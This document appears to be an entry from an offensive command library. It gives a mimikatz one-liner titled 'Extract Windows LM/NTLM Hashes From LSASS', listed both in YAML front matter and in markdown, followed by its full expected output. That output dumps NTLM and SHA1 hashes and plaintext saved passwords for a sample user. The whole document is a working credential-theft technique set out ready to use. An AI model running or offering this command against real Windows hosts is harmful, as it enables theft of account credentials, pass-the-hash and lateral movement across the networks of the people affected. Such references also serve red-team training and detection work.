---
id: 92396b13-6d83-4737-ae7b-c5b8260ba77a
name: Extract Windows LM/NTLM Hashes From LSASS
type: command
executor: bash
data: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
output: "C:\\Users\\BOB\\Desktop>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"\
  \ \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47\n .##\
  \ ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi`\
  \ ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n\
  \ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'\
  \        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline)\
  \ # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # sekurlsa::logonpasswords\n\
  \nAuthentication Id : 0 ; 1001963 (00000000:000f49eb)\nSession           : Interactive\
  \ from 1\nUser Name         : BOB\nDomain            : BOB-PC\nLogon Server    \
  \  : BOB-PC\nLogon Time        : 9/27/2019 12:10:06 PM\nSID               : S-1-5-21-3521375537-2753578558-3836635798-1001\n\
  \        msv :\n         [00000003] Primary\n         * Username : BOB\n       \
  \  * Domain   : BOB-PC\n         * NTLM     : a87f3a337d73085c45f9416be5787d86\n\
  \         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba\n        tspkg :\n\
  \        wdigest :\n         * Username : BOB\n         * Domain   : BOB-PC\n  \
  \       * Password : (null)\n        kerberos :\n         * Username : BOB\n   \
  \      * Domain   : BOB-PC\n         * Password : (null)\n        ssp :\n      \
  \  credman :\n         [00000000]\n         * Username : admin\n         * Domain\
  \   : 10.10.10.10\n         * Password : secretpassword!\n         [00000001]\n\
  \         * Username : BOB\n         * Domain   : 1.1.1.1\n         * Password :\
  \ hunter2\n\nAuthentication Id : 0 ; 1001919 (00000000:000f49bf)\nSession      \
  \     : Interactive from 1\nUser Name         : BOB\nDomain            : BOB-PC\n\
  Logon Server      : BOB-PC\nLogon Time        : 9/27/2019 12:10:06 PM\nSID     \
  \          : S-1-5-21-3521375537-2753578558-3836635798-1001\n        msv :\n   \
  \      [00000003] Primary\n         * Username : BOB\n         * Domain   : BOB-PC\n\
  \         * NTLM     : a87f3a337d73085c45f9416be5787d86\n         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba\n\
  \        tspkg :\n        wdigest :\n         * Username : BOB\n         * Domain\
  \   : BOB-PC\n         * Password : (null)\n        kerberos :\n         * Username\
  \ : BOB\n         * Domain   : BOB-PC\n         * Password : (null)\n        ssp\
  \ :\n        credman :\n         [00000000]\n         * Username : admin\n     \
  \    * Domain   : 10.10.10.10\n         * Password : secretpassword!\n         [00000001]\n\
  \         * Username : BOB\n         * Domain   : 1.1.1.1\n         * Password :\
  \ hunter2\n...\n...\n\nmimikatz(commandline) # exit\nBye!\n"
created_at: '2019-09-27T21:15:40.389492+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Extract Windows LM/NTLM Hashes From LSASS

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## Expected Output

```
C:\Users\BOB\Desktop>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 1001963 (00000000:000f49eb)
Session           : Interactive from 1
User Name         : BOB
Domain            : BOB-PC
Logon Server      : BOB-PC
Logon Time        : 9/27/2019 12:10:06 PM
SID               : S-1-5-21-3521375537-2753578558-3836635798-1001
        msv :
         [00000003] Primary
         * Username : BOB
         * Domain   : BOB-PC
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba
        tspkg :
        wdigest :
         * Username : BOB
         * Domain   : BOB-PC
         * Password : (null)
        kerberos :
         * Username : BOB
         * Domain   : BOB-PC
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 10.10.10.10
         * Password : secretpassword!
         [00000001]
         * Username : BOB
         * Domain   : 1.1.1.1
         * Password : hunter2

Authentication Id : 0 ; 1001919 (00000000:000f49bf)
Session           : Interactive from 1
User Name         : BOB
Domain            : BOB-PC
Logon Server      : BOB-PC
Logon Time        : 9/27/2019 12:10:06 PM
SID               : S-1-5-21-3521375537-2753578558-3836635798-1001
        msv :
         [00000003] Primary
         * Username : BOB
         * Domain   : BOB-PC
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba
        tspkg :
        wdigest :
         * Username : BOB
         * Domain   : BOB-PC
         * Password : (null)
        kerberos :
         * Username : BOB
         * Domain   : BOB-PC
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 10.10.10.10
         * Password : secretpassword!
         [00000001]
         * Username : BOB
         * Domain   : 1.1.1.1
         * Password : hunter2
...
...

mimikatz(commandline) # exit
Bye!

```


